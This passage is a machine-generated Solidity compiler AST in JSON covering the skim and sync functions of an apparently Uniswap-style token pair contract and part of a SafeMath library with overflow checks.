																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 2135,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 533,
																				"src": "17913:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 2137,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "17913:15:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$533",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 2138,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 494,
																		"src": "17913:25:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 2142,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "17913:40:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 2143,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2239,
																"src": "17913:44:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 2145,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "17913:54:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2132,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1070,
														"src": "17849:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 2146,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17849:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2147,
												"nodeType": "ExpressionStatement",
												"src": "17849:128:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2149,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2129,
															"src": "18014:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 2150,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2119,
															"src": "18035:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2160,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "18096:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2156,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2355,
																					"src": "18085:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_Pair_$2193",
																						"typeString": "contract Pair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_Pair_$2193",
																						"typeString": "contract Pair"
																					}
																				],
																				"id": 2155,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "18077:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 2157,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18077:13:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2152,
																					"name": "_token1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2129,
																					"src": "18058:7:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 2151,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 533,
																				"src": "18051:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 2153,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18051:15:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$533",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 2154,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 494,
																		"src": "18051:25:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 2158,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18051:40:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 2159,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2239,
																"src": "18051:44:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 2161,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18051:54:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2148,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1070,
														"src": "17987:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 2162,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17987:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2163,
												"nodeType": "ExpressionStatement",
												"src": "17987:128:6"
											}
										]
									},
									"documentation": null,
									"id": 2165,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 2122,
											"modifierName": {
												"argumentTypes": null,
												"id": 2121,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "17736:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "17736:4:6"
										}
									],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2120,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2119,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2165,
												"src": "17715:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2118,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "17715:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17714:12:6"
									},
									"returnParameters": {
										"id": 2123,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "17741:0:6"
									},
									"scope": 2193,
									"src": "17701:421:6",
									"stateMutability": "nonpayable",
									"superFunction": 839,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2191,
										"nodeType": "Block",
										"src": "18198:184:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2176,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2355,
																			"src": "18262:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Pair_$2193",
																				"typeString": "contract Pair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Pair_$2193",
																				"typeString": "contract Pair"
																			}
																		],
																		"id": 2175,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18254:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 2177,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18254:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2172,
																			"name": "token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 968,
																			"src": "18236:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 2171,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 533,
																		"src": "18229:6:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 2173,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18229:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$533",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 2174,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 494,
																"src": "18229:24:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 2178,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18229:39:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2184,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2355,
																			"src": "18315:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Pair_$2193",
																				"typeString": "contract Pair"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_Pair_$2193",
																				"typeString": "contract Pair"
																			}
																		],
																		"id": 2183,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "18307:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 2185,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18307:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 2180,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 970,
																			"src": "18289:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 2179,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 533,
																		"src": "18282:6:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 2181,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18282:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$533",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 2182,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 494,
																"src": "18282:24:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 2186,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18282:39:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2187,
															"name": "reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 974,
															"src": "18335:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 2188,
															"name": "reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 976,
															"src": "18357:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 2170,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1255,
														"src": "18208:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 2189,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18208:167:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2190,
												"nodeType": "ExpressionStatement",
												"src": "18208:167:6"
											}
										]
									},
									"documentation": null,
									"id": 2192,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 2168,
											"modifierName": {
												"argumentTypes": null,
												"id": 2167,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "18193:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "18193:4:6"
										}
									],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2166,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18181:2:6"
									},
									"returnParameters": {
										"id": 2169,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "18198:0:6"
									},
									"scope": 2193,
									"src": "18168:214:6",
									"stateMutability": "nonpayable",
									"superFunction": 842,
									"visibility": "external"
								}
							],
							"scope": 2194,
							"src": "226:18158:6"
						}
					],
					"src": "36:18349:6"
				},
				"id": 6
			},
			"src/SafeMath.sol": {
				"ast": {
					"absolutePath": "src/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							2268
						]
					},
					"id": 2269,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2195,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0",
								"<",
								"0.7",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:31:7"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2268,
							"linearizedBaseContracts": [
								2268
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2216,
										"nodeType": "Block",
										"src": "267:66:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2212,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2209,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2205,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2202,
																			"src": "286:1:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2208,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2206,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2197,
																				"src": "290:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2207,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2199,
																				"src": "294:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "290:5:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "286:9:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2210,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "285:11:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2211,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2197,
																"src": "300:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "285:16:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6164642d6f766572666c6f77",
															"id": 2213,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "303:22:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															},
															"value": "ds-math-add-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															}
														],
														"id": 2204,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "277:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2214,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "277:49:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2215,
												"nodeType": "ExpressionStatement",
												"src": "277:49:7"
											}
										]
									},
									"documentation": null,
									"id": 2217,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2197,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "211:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2196,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "211:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2199,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "222:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2198,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "222:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "210:22:7"
									},
									"returnParameters": {
										"id": 2203,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2202,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "256:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2201,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "256:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "255:11:7"
									},
									"scope": 2268,
									"src": "198:135:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2238,
										"nodeType": "Block",
										"src": "408:67:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2234,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2231,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2227,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2224,
																			"src": "427:1:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2230,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2228,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2219,
																				"src": "431:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2229,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2221,
																				"src": "435:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "431:5:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "427:9:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2232,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "426:11:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2233,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2219,
																"src": "441:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "426:16:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
